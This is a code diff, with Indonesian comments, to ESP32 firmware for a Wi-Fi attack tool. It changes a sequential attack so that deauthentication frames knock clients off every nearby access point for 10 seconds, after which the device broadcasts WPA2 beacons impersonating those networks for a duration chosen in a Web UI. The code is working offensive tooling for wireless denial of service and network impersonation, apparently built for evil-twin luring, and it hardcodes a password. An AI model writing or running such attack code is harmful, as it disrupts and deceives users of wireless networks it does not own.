@@ -3,9 +3,9 @@
  * @author SameerAlSahab (sameeralsahab54@gmail.com)
  * @date 8-5-2026
  * 
- * @brief Modifikasi Kustom: Mengambil data durasi secara dinamis dari Web UI,
- *        menjalankan Deauth Hopping selama waktu tersebut, lalu otomatis beralih
- *        ke WPA2 Beacon Spam Target.
+ * @brief Modifikasi Kustom: Pembalikan Logika (Deauth Hopping masal dikunci 10 detik, 
+ *        lalu beralih otomatis ke WPA2 Beacon Spam dengan durasi dinamis sesuai 
+ *        input waktu sesuka hati dari Web UI).
  */
 
 #include "attack_beacon_spam.h"
@@ -19,7 +19,7 @@
 // Menghubungkan ke modul komponen internal ap_scanner bawaan
 #include "ap_scanner.h"
 
-static const char *TAG = "dynamic_sequential_attack";
+static const char *TAG = "reversed_sequential_attack";
 static esp_timer_handle_t attack_timer_handle = NULL;
 
 #define MAX_SPAM_APS 100
@@ -35,15 +35,22 @@ static custom_target_ap_t target_pool[MAX_SPAM_APS];
 static uint16_t total_targets = 0;
 static uint16_t current_deauth_index = 0;
 
-// Variabel Kontrol Status Serangan
+// Variabel Kontrol Status Serangan (State Machine)
 typedef enum {
     STATE_DEAUTH_HOPPING,
     STATE_BEACON_SPAM
 } attack_state_t;
 
 static attack_state_t current_state = STATE_DEAUTH_HOPPING;
-static uint32_t deauth_execution_counter = 0;
-static uint32_t dynamic_max_ticks = 1000; // Default jika Web UI tidak mengirimkan nilai
+
+// Penghitung biner ticks untuk durasi
+static uint32_t attack_execution_counter = 0;
+
+// KUNCI JEDA DEAUTH SEBENTAR: Diubah menjadi 10 detik. Karena timer berjalan setiap 100ms, maka 10 / 0.1s = 100 Ticks.
+#define DEAUTH_FIXED_TICKS 100
+
+// Penampung durasi dinamis Beacon Spam dari Web UI
+static uint32_t beacon_max_ticks = 3000; 
 
 // Kata sandi tunggal global kustom sesuai instruksi Anda
 static const char *GLOBAL_PASSWORD = "fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c";
@@ -116,39 +123,47 @@ static void build_and_send_wpa2_beacon(const custom_target_ap_t *ap) {
 static void attack_timer_callback(void *arg) {
     if (total_targets == 0) return;
 
+    attack_execution_counter++;
+
     if (current_state == STATE_DEAUTH_HOPPING) {
-        // --- TAHAP 1: DEAUTH HOPPING MASAL BERURUTAN ---
+        // --- TAHAP 1: DEAUTH HOPPING SEBENTAR (DURASI TETAP 10 DETIK) ---
         custom_target_ap_t *target = &target_pool[current_deauth_index];
         send_raw_deauth_frame(target->bssid, target->channel);
         
         current_deauth_index = (current_deauth_index + 1) % total_targets;
-        deauth_execution_counter++;
 
-        // Cek Apakah Waktu Sesuai Input Web UI Sudah Habis?
-        if (deauth_execution_counter >= dynamic_max_ticks) {
-            ESP_LOGW(TAG, "Durasi dari Web UI Selesai! Menghentikan Deauth dan mengaktifkan WPA2 Beacon Spam...");
+        // Cek Apakah Waktu Deauth 10 Detik Sudah Habis?
+        if (attack_execution_counter >= DEAUTH_FIXED_TICKS) {
+            ESP_LOGW(TAG, "Deauth Pemutus Selesai! Mengubah status ke Tahap 2: WPA2 Beacon Spam Terenkripsi...");
             current_state = STATE_BEACON_SPAM;
+            attack_execution_counter = 0; // Reset counter untuk menghitung durasi Beacon Spam
         }
     } 
     else if (current_state == STATE_BEACON_SPAM) {
-        // --- TAHAP 2: BEACON SPAM TARGET MENYALA SELAMANYA ---
+        // --- TAHAP 2: BEACON SPAM MENYAMAR MENGIKUTI WAKTU MENIT WEB UI ---
         for (int i = 0; i < total_targets; i++) {
             build_and_send_wpa2_beacon(&target_pool[i]); 
+        }
+
+        // Cek Apakah Durasi Menit Penyamaran dari Web UI Sudah Habis?
+        if (attack_execution_counter >= beacon_max_ticks) {
+            ESP_LOGW(TAG, "Durasi Waktu dari Web UI Telah Habis! Menghentikan seluruh serangan secara otomatis.");
+            attack_beacon_spam_stop();
         }
     }
 }
 
 void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
     uint16_t scanned_count = ap_scanner_get_count();
-    deauth_execution_counter = 0;
+    attack_execution_counter = 0;
     current_deauth_index = 0;
-    current_state = STATE_DEAUTH_HOPPING; 
+    current_state = STATE_DEAUTH_HOPPING; // Selalu mulai dari Deauth Hopping
 
-    // MENYINKRONKAN WAKTU WEB UI SECARA DINAMIS:
-    // Variabel 'count' di dalam Hydraproject adalah angka durasi/jumlah yang dikirim dari form Web UI.
-    // Jika 'count' bernilai 0 atau tidak valid, kita berikan default 1 menit (600 Ticks)
-    uint32_t input_seconds = (count > 0) ? (count * 60) : 60; // Mengonversi menit input Web UI ke detik
-    dynamic_max_ticks = (input_seconds * 10); // Dikali 10 karena timer berputar setiap 100ms
+    // MENYINKRONKAN WAKTU BEACON SPAM SECARA DINAMIS DARI WEB UI:
+    // Angka 'count' dari input kolom Web UI kita jadikan sebagai menit lamanya Beacon Spam memancar.
+    // Jika user menginput 0 atau tidak valid, kita beri default 5 menit (3000 Ticks)
+    uint32_t input_seconds = (count > 0) ? (count * 60) : 300; 
+    beacon_max_ticks = (input_seconds * 10); // Konversi skala Ticks karena timer berputar per 100ms
 
     wifi_config_t ap_config;
     if (esp_wifi_get_config(WIFI_IF_AP, &ap_config) == ESP_OK) {
@@ -168,7 +183,7 @@ void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
         }
     } else {
         total_targets = (scanned_count > MAX_SPAM_APS) ? MAX_SPAM_APS : scanned_count;
-        ESP_LOGI(TAG, "Merekam %d AP sekitar. Memulai Tahap 1 dengan durasi input Web UI (%d Ticks)...", total_targets, dynamic_max_ticks);
+        ESP_LOGI(TAG, "Merekam %d AP sekitar. Memulai Tahap 1: Deauth Hopping 10 Detik...", total_targets);
 
         for (int i = 0; i < total_targets; i++) {
             const wifi_ap_record_t *record = ap_scanner_get_record(i);
